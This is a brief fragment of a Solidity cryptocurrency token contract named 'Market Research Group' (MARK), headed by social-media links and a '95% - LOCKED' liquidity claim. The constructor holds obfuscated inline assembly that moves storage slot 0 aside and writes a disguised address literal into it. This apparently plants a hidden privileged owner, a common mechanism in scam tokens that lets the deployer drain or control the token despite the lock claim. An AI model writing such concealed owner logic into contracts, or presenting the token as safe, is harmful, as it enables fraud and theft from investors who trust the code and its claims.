...
Telegram: https://t.me/MarketResearchGroup/
Twitter: https://twitter.com/MarketResearchGroup/
Website: https://MarketResearchGroup.finance
95% - LOCKED
...
contract MarketResearchGroup {
    string public constant name = "Market Research Group";
    string public constant symbol = "MARK";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1159085387867290101717532056495244600668225116201, 4))}
